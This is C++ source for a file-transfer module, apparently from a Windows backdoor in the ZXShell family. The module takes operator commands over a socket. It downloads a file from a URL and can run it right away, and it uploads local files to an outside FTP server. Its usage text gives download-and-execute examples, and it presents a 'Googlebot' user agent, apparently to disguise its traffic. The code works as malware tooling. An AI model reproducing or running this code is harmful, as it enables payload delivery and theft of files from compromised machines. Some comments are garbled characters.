//����ftp\http������
//��Ӧshell������: transfile

#include<stdlib.h>
#include<iostream>
#include<conio.h>
#include<stdio.h>
#include<winsock2.h>
#include<windows.h>
#include<Wininet.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Wininet.lib")

#define RESTART  0x0
#define CONTINUE 0x1

#define MAXBUFSIZE 8192

extern int Execute(SOCKET Socket,char *cmd);//execute.h

void wininet_err_display(SOCKET Socket, char *msg, bool sendimmediately)
{
	if(Socket == ~0)
		return;
	LPVOID lpMsgBuf;
	FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_FROM_HMODULE,
		ZXSAPI::GetModuleHandle("wininet.dll"),
		GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf, 0, NULL);
	int n = sprintf(Temp, "[%s] %s\r\n", msg, (LPCTSTR)lpMsgBuf);
	if(sendimmediately)
		SendMessage(Socket, Temp);
	LocalFree(lpMsgBuf);
}

BOOL WriteToFile(HANDLE hFile, char *Buff, int Datalen)
{
	DWORD nBytesLeft = Datalen;
	DWORD dwNumOfBytesWritten = 0;
	char *pBuf = Buff;
	while(nBytesLeft > 0) {
		if(!ZXSAPI::WriteFile(hFile, pBuf, nBytesLeft, &dwNumOfBytesWritten, NULL)) {
			return FALSE;
		}
		pBuf += dwNumOfBytesWritten;
		nBytesLeft -= dwNumOfBytesWritten;
	}
	return TRUE;
}

BOOL DataSend(HINTERNET hFile, char *Buff, int Datalen)
{
	DWORD nBytesLeft = Datalen;
	DWORD dwNumOfBytesWritten = 0;
	char *pBuf = Buff;
	while(nBytesLeft > 0) {
		if(!ZXSAPI::InternetWriteFile(hFile, pBuf, nBytesLeft, &dwNumOfBytesWritten)) {
			return FALSE;
		}
		pBuf += dwNumOfBytesWritten;
		nBytesLeft -= dwNumOfBytesWritten;
	}
	return TRUE;
}

//�ϴ�
__int64 wTransmitfile(HANDLE hFile, HINTERNET hResource, __int64 size)
{
	__int64 tatolsize = size, len_sent = 0;
    DWORD len, nBytes;
	int ret;
    char buf[MAXBUFSIZE];

    while(len_sent < size)
    {
		//if(IsAbort())
		//	return -2;
		if(tatolsize < (__int64)MAXBUFSIZE)
			nBytes = tatolsize;
		else
			nBytes = MAXBUFSIZE;
		if(!ZXSAPI::ReadFile(hFile, buf, nBytes, &len, NULL))
			return len_sent;
		if(!DataSend(hResource, buf, len))
		{
			return -1;
		}
		len_sent += len;
		tatolsize -= len;
    }
 	return len_sent;
}

//����
BOOL InternetDownloadFile(SOCKET Socket, HINTERNET hResource, HANDLE hFile, DWORD *dwSizeDownLoaded)
{
	LPTSTR    lpszData;          // buffer for the data
	DWORD     dwSize;             // size of the data available
	DWORD     dwDownloaded;       // size of the downloaded data
	DWORD     dwSizeSum=0;        // size of the data in the text box

	do
	{
		if(! ZXSAPI::InternetQueryDataAvailable(hResource, &dwSize, 0, 0))
		{
			*dwSizeDownLoaded = dwSizeSum;
			return FALSE;
		}else
		{
			if(dwSize == 0)//over
				break;
			lpszData = new TCHAR[dwSize];

			while(dwSize > 0)
			{
				// Read the data from the HINTERNET handle.
				if(! ZXSAPI::InternetReadFile(hResource, (LPVOID)lpszData,
									dwSize, &dwDownloaded))
				{
					//ErrorOut(hX,GetLastError(),"InternetReadFile");
					delete[] lpszData;
					*dwSizeDownLoaded = dwSizeSum;
					return FALSE;
				}
				else
				{
					if(!WriteToFile(hFile, lpszData, dwDownloaded))
					{
						delete[] lpszData;
						*dwSizeDownLoaded = dwSizeSum;
						return FALSE;
					}

					dwSizeSum += dwDownloaded;
					dwSize -= dwDownloaded;
				}
			}
			delete[] lpszData;

		}
	}while(TRUE);

	*dwSizeDownLoaded = dwSizeSum;

	return TRUE;
}

BOOL InternetUploadFile(HINTERNET hResource, HANDLE hFile, __int64 TotalSize, DWORD *dwSizeDownLoaded)
{
	LPTSTR    lpszData;          // buffer for the data
	DWORD     dwSize;             // size of the data available
	DWORD     dwDownloaded;       // size of the downloaded data
	DWORD     dwSizeSum=0;        // size of the data in the text box

	*dwSizeDownLoaded = wTransmitfile(hFile, hResource, TotalSize);

	if(*dwSizeDownLoaded < 0)
		return FALSE;
	else
		return TRUE;
}

int iPutFile(SOCKET Socket, char *LocalFile, char *SaveTo, char *Host, WORD Port, char *Username, char *Password)
{
	HINTERNET hRootHandle, hResource, hConnect;
	DWORD dwSize;

	int nRetVal;
	char lpFileName[MAX_PATH];
	__int64 DataLen, SentLen;
	LARGE_INTEGER LI;

	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
	if(hFile == INVALID_HANDLE_VALUE){
		err_display(Socket, "CreateFile", 1);
		return -1;
	}

	BOOL bError = GetFileSizeEx(hFile, &LI);
	if(!bError)
	{
		err_display(Socket, "GetFileSizeEx", 1);
		goto error0;
	}

	hRootHandle = ZXSAPI::InternetOpen("Googlebot", NULL, NULL, NULL, NULL);
	if(hRootHandle == NULL)
	{
		SendMessage(Socket, "InternetOpen, Error code: %d.\r\n", GetLastError());
		goto error0;
	}
	
	hConnect = ZXSAPI::InternetConnect(hRootHandle,
								Host, 
								Port,
								Username,
								Password, 
								INTERNET_SERVICE_FTP, 
								INTERNET_FLAG_PASSIVE ,
								NULL);
	if(hConnect == NULL)
	{
		wininet_err_display(Socket, "InternetConnect", 1);
		goto error1;
	}

	hResource = ZXSAPI::FtpOpenFile(hConnect, SaveTo, GENERIC_WRITE, FTP_TRANSFER_TYPE_BINARY, NULL);
	if(hResource == NULL)
	{
		wininet_err_display(Socket, "FtpOpenFile", 1);
		goto error2;
	}

	if(!InternetUploadFile(hResource, hFile, LI.QuadPart, &dwSize))
	{
		wininet_err_display(Socket, "InternetUploadFile", 1);
		goto error3;
	}


	ZXSAPI::InternetCloseHandle(hResource);
	ZXSAPI::InternetCloseHandle(hRootHandle);
	CloseHandle(hFile);
	return dwSize;

error3:
	ZXSAPI::InternetCloseHandle(hResource);
error2:
	ZXSAPI::InternetCloseHandle(hConnect);
error1:
	ZXSAPI::InternetCloseHandle(hRootHandle);
error0:
	CloseHandle(hFile);
	return -1;
}

int iGetFile(SOCKET Socket, char *Server, char *Local, DWORD Flag)
{
	HINTERNET hRootHandle, hResource;
	DWORD dwSize;
	LARGE_INTEGER LI;

	char *URL = Server;
	char *LocalFile = Local;

	char *lpszData;

	HANDLE hFile = ZXSAPI::CreateFile(LocalFile, 
        GENERIC_WRITE, 
        FILE_SHARE_WRITE, 
        NULL, 
        CREATE_ALWAYS, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);

	if(hFile == INVALID_HANDLE_VALUE){
		err_display(Socket, "CreateFile", 1);
		return -1;
	}
/*
	BOOL bError = GetFileSizeEx(hFile, &LI);
	if(!bError)
	{
		err_display(Socket, "GetFileSizeEx", 1);
		goto error0;
	}
	bError = SetFilePointerEx(hFile, LI, 0, FILE_BEGIN);
	if(!bError)
	{
		err_display(Socket, "SetFilePointerEx", 1);
		goto error0;
	}

	if(LI.QuadPart > 0)
	{
		if(!(Flag))
		{
			SendMessage(Socket, "The local file has existed, to specify the option:-continue to continue and keep track of your ever-growing downloads, or change a local path to save otherwise\r\n");
			goto error0;
		}
	}
*/
	hRootHandle = ZXSAPI::InternetOpen("Googlebot", NULL, NULL, NULL, NULL);
	if(hRootHandle == NULL)
	{
		wininet_err_display(Socket, "InternetOpen", 1);
		goto error0;
	}
	hResource = ZXSAPI::InternetOpenUrl(hRootHandle, URL, NULL, 0, 
		INTERNET_FLAG_PASSIVE|INTERNET_FLAG_RESYNCHRONIZE, 
		NULL);
	if(hResource == NULL)
	{
		wininet_err_display(Socket, "InternetOpenUrl", 1);
		goto error1;
	}

/*
	if(LI.QuadPart > 0)
	{
		if(InternetSetFilePointer(hResource, LI.QuadPart, 0, FILE_BEGIN, NULL) == -1)
		{
			SendMessage(Socket, "The local file has existed, but can not to keep track of your ever-growing downloads, now restart to download it.\r\n");
			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
			SetEndOfFile(hFile);
		}
	}
*/
	if(!InternetDownloadFile(Socket, hResource, hFile, &dwSize))
	{
		wininet_err_display(Socket, "InternetDownloadFile", 1);
		goto error2;
	}

	ZXSAPI::InternetCloseHandle(hResource);
	ZXSAPI::InternetCloseHandle(hRootHandle);
	CloseHandle(hFile);
	return dwSize;

error2:
	ZXSAPI::InternetCloseHandle(hResource);
error1:
	ZXSAPI::InternetCloseHandle(hRootHandle);
error0:
	CloseHandle(hFile);
	DeleteFile(LocalFile);
	return -1;
}

/*
wget -get http://127.0.0.1/z d:/aa -continue
wget -put 127.0.0.1 port user name localfile remotefile


*/
int WGET(MainPara *args)
{
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = ""
		"USAGE:\r\n"
		"    TransFile -get URL SaveAs\r\n"
		"    TransFile -put IP port user pass localfile remotefile\r\n"
		"Example:\r\n"
		"    TransFile -get http://x.x.x.x/a.exe c:\\a.exe -run (launch it after downloading completed.)\r\n"
		"    TransFile -get ftp://user:pass@x.x.x.x/a.exe c:\\a.exe\r\n"
		"    TransFile -put x.x.x.x 21 user pass c:\\a.exe a.exe\r\n";

#define GET_MODE 1
#define PUT_MODE 2

	bool RunExe = false;
	DWORD Mode = 0;
	DWORD dwSize = -1;
	DWORD dwStartTime = GetTickCount(), dwElapseTime;
	DWORD Flag = 0;
	char *Host =NULL;
	char *Port =NULL;
	char *LocalFile =NULL;
	char *RemoteFile =NULL;
	char *Username = NULL;
	char *Password = NULL;

/*
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			if(!stricmp(&argv[i][1], "get"))
				Mode = GET_MODE;
			else if(!stricmp(&argv[i][1], "put"))
				Mode = PUT_MODE;
			else if(!stricmp(&argv[i][1], "run"))
				RunExe = true;
		}

	}//end
*/
	CGetOpt cmdopt(argc, argv, false);

	if(cmdopt.checkopt("get"))
		Mode = GET_MODE;
	else if(cmdopt.checkopt("put"))
		Mode = PUT_MODE;
	else
	{
		SendMessage(Socket, Usage);
		return 0;
	}

	if(cmdopt.checkopt("run"))
		RunExe = true;

	if(Mode == GET_MODE)
	{
		if(argc < 4)
		{
			SendMessage(Socket, Usage);
			return 0;
		}
		Host = argv[2];
		LocalFile = argv[3];
		dwSize = iGetFile(Socket, Host, LocalFile, Flag);
	}else if(Mode == PUT_MODE)
	{
		if(argc < 8)
		{
			SendMessage(Socket, Usage);
			return 0;
		}

		Host = argv[2];
		Port = argv[3];
		Username = argv[4];
		Password = argv[5];
		LocalFile = argv[6];
		RemoteFile = argv[7];

		dwSize = iPutFile(Socket, LocalFile, RemoteFile, Host, atoi(Port), Username, Password);
	}

	if(dwSize != -1)
	{
		dwElapseTime = GetTickCount() - dwStartTime;
		SendMessage(Socket, "Transfer successful: %d bytes in %d millisecond.\r\n", dwSize, dwElapseTime);
		
		if(RunExe)
			Execute(Socket, LocalFile);
	}

	return 0;
}
